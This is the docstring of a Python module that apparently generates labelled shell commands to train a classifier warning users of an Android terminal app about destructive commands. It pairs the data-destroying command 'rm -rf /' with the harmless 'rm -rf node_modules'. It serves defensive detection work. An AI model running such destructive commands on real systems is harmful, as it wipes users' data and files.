"""Combinatorial generator for destructive shell commands.

Why a generator rather than an LLM
----------------------------------
The obvious way to build 40k labelled commands is to ask a language model for
them. That makes the *label* a prediction, which means the dataset carries
label noise, and label noise in a classification problem is
indistinguishable from a hard learning problem in the loss curve — you end up
debugging the model for something that was wrong in the data.

Here the label is correct by construction. A :class:`Rule` names a category,
the category carries the risk class, and the slots only vary the surface form.
The generator cannot emit a mislabelled row, so the whole budget of
``grammar.py`` goes into diversity of *input* instead of noise in *output*.

The contrast that matters most
------------------------------
Almost every rule here has a safe twin that differs only in one slot. That is
the entire point:

    rm -rf /            destructive
    rm -rf node_modules safe

Both come from the same ``rm``, the same flags, generated by the same code. A
model that only learns "``rm`` plus ``-rf`` equals danger" gets every one of
those wrong, and a warning that fires on ``rm -rf node_modules`` is a warning
the user learns to dismiss — which kills the feature. The pairs are therefore
listed next to each other in the slot tables and are asserted to exist in
``ml/tests/test_dataset.py``.

Android paths are first-class
-----------------------------
Drosh runs on a phone, so ``/sdcard``, ``/storage/emulated/0`` and
``/data/data/<package>`` belong in the system-path list alongside ``/etc``. A
model trained only on desktop paths has never seen the paths that actually
matter to its users.
"""

